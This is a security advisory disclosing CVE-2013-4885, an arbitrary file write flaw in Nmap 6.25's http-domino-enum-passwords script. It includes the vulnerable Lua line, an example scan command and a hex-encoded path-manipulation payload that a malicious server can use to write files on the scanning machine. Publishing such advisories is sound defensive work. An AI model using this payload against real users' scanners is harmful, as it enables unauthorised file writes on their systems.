Subject: TWSL2013-025: Arbitrary File Upload Vulnerability
 in Official Nmap Http-domino-enum-passwords NSE script

Trustwave SpiderLabs Security Advisory TWSL2013-025:
Arbitrary File Upload Vulnerability in Official Nmap
Http-domino-enum-passwords NSE script

Published: 08/02/13
Version: 1.0

Vendor: Nmap (http://nmap.org/)
Product: Nmap NSE script
Version affected: Nmap 6.25

Product description:
Nmap ("Network Mapper") is a free and open source (license) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network inventory,
managing service upgrade schedules, and monitoring host or service uptime.
Nmap uses raw IP packets in novel ways to determine what hosts are
available on the network, what services (application name and version)
those hosts are offering, what operating systems (and OS versions) they are
running, what type of packet filters/firewalls are in use, and dozens of
other characteristics. It was designed to rapidly scan large networks, but
works fine against single hosts. Nmap runs on all major computer operating
systems, and official binary packages are available for Linux, Windows, and
Mac OS X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer (Zenmap), a flexible data
transfer, redirection, and debugging tool (Ncat), a utility for comparing
scan results (Ndiff), and a packet generation and response analysis tool
(Nping).


Finding 1: Arbitrary File Upload Vulnerability
*****Credit: Piotr Duszynski @drk1wi of Trustwave SpiderLabs
CVE: CVE-2013-4885

It is possible to write arbitrary files to a remote system, through a
specially crafted server response for NMAP http-domino-enum-passwords.nse
script (from the official Nmap repository).


Example vulnerable command:

nmap --script domino-enum-passwords -p 80 <evil_host> --script-args domino-enum-passwords.username='patrik karlsson',domino-enum-passwords.password=secret,domino-enum-passwords.idpath='/tmp'


Vulnerable code:

...
local status, err = saveIDFile( ("%s/%s.id"):format(download_path, u_details.fullname), http_response.body )
...

This issue can be only exploited if the 'domino-enum-passwords.idpath'
parameter is present.  In order to bypass the second format string
parameter "%s.id" and be able to write arbitrary files to the operating
system the following payload should be appended to the first format string
parameter value:

"\x00\x61\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x25\x64\x0d\x0a"
